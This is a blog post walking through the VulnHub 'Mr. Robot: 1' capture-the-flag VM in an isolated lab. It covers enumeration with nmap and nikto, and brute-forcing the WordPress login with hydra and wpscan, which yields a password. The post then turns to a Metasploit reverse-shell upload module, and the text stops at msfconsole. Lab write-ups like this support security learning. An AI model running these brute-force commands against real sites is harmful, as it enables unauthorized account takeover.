---
layout: post
title: "Mr. Robot"
date: 2022-04-10 20:50:57 +0200
categories: jekyll update
excerpt: "Lorem ipsum dolor sit amet, consectetur adipiscing elit. Cras nulla nisi, gravida eget lacus sed, feugiat rhoncus lectus. Maecenas condimentum rutrum dolor, ut ultrices risus tempor vel. Mauris sed iaculis elit, id efficitur nulla. Morbi vitae purus et eros venenatis hendrerit quis non nibh. Suspendisse est turpis, ultricies et ipsum et, semper tincidunt ex. Phasellus accumsan enim nec arcu mollis ultricies. Suspendisse congue mi diam, ut auctor turpis faucibus ut."
---

# Mr Robot: 1

[[Mr-Robot: 1](https://www.vulnhub.com/entry/mr-robot-1,151/)] has 3 flags to find.

## Preparation

The virtual machines are placed onto the same isolated internal network where they can only communicate with each other.

On the isolated internal network, a VirtualBox DHCP server assigns IP addresses to the machines:

```cmd
vboxmanage dhcpserver add --network=intnet --server-ip=10.38.1.1 --lower-ip=10.38.1.110 --upper-ip=10.38.1.120 --netmask=255.255.255.0 --enable
```

The **Kali** machine received the IP address `10.38.1.110`.

Launching **Mr. Robot**, we're presented with a login screen that cannot be bypassed as the login credentials aren't known.

## Enumeration

**Nmap** can be used to discover the vulnerable machine on the network:

```sh
kali@kali$ nmap -sS -T4 10.38.1.110-120
```

```

```

**Nmap** found the vulnerable machine and reported it with the IP address `10.38.1.111` and with TCP ports `80` (http) and `443` (https) open.

Looking up `10.38.1.111` in a web browser, we're presented with the clone of the promotion website of the Mr. Robot TV series.

## 1st Flag

**Nikto** can be used to gather further information about the web server.

```

```

1. The server leaks inodes via ETags and a header has been found with file **/robots.txt**

```

```

2. The server is running **Wordpress**

```

```

> Note<br>
> A [robots.txt](https://developers.google.com/search/docs/advanced/robots/intro) file tells search engine crawlers which URLs the crawler can access on your site.
> This is used mainly to avoid overloading your site with requests; it is not a mechanism for keeping a web page out of Google.

**robots.txt** indicates that the server doesn't have an user agent but it has two files:

- fsocity.dic
- key-1-of-3.txt

**wget** can be used to download the files:

```sh
kali@kali$ wget 10.38.1.111/fsocity.dic
kali@kali$ wget 10.38.1.111/key-1-of-3.txt
```

```sh
kali@kali$ cat key-1-of-3.txt

```

## 2nd Flag

As SSL isn't enabled on the Wordpress login page, it may be bruteforced with the downloaded dictionary file.

`fsocity.dic` contains duplicated entries that should be removed.

```sh
kali@kali$ cat fsocity.dic | sort -u | uniq > wordlist.dic
```

The word count of the dictionary has decreased from `858160` to `11451`.

```
kali@kali$ wc -l fsocity.dic
858160 fsocity.dic
```

```
kali@kali$ wc -l wordlist.dic
11451 wordlist.dic
```

To start the bruteforce attack, we need to intercept an [http POST request](<https://en.wikipedia.org/wiki/POST_(HTTP)>) in [Burp Suite](https://portswigger.net/burp).

To do that, a manual proxy must be configured in the browser and Burp Suite should have the same Proxy Listener set:

- HTTP Proxy: `127.0.0.1`
- Port: `8080`

In the intercepted POST request - that has been sent to the server - we're looking for the `log`, `pwd`, and the `wp-submit` fields.

**hydra** can be used to guess the username:

```sh
kali@kali$ hydra -V -L fsocity.dic -p 123 10.38.1.111 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'
```

- `-V` — Verbose
- `-L fsocity.dic` — Define dictionary
- `-p 123` — Random unique password
- `10.38.1.111` — IP of the vulnerable machine
- `http-post-form` — An http POST form is being bruteforced
- `/wp-login.php` — Path where the form is located
- `log=^USER^&pwd=^PASS&wp-submit=Log+In` — POST parameters to send, including placeholders
- `F=Invalid Username` — Consider an attempt as failure if the response contains the text "Invalid Username".

**hydra** has found 3 possible usernames:

```sh
[80][http-post-form] host: 10.38.1.111 login: elliot password: 123
[80][http-post-form] host: 10.38.1.111 login: Elliot password: 123
[80][http-post-form] host: 10.38.1.111 login: ELLIOT password: 123
```

**wpscan** can be used to find additional WordPress vulnerabilities and to bruteforce the password using the word list.

```sh
kali@kali$ wpscan --url 10.28.1.111 --passwords /home/kali/mrrobot/wordlist.dic --usernames Elliot
```

**wpscan** has found several outdated plugins and one valid username - password pair.

```sh
[+] performing password attach on Xmlrpc Multicall against 1 user/s
[SUCCESS] - Elliot - / ER28-0652
All Found
Progress Time: 00:00:19 <========================================================================

[!] Valid Combinations Found:
 | Username: Elliot, Password: ER28-0652
```

**Metasploit** [WordPress Admin Shell Upload](https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_admin_shell_upload/) module creates a small WordPress plugin that connects back to the attacking machine and spawns a reverse shell.

```sh
kali@kali$ msfconsole
```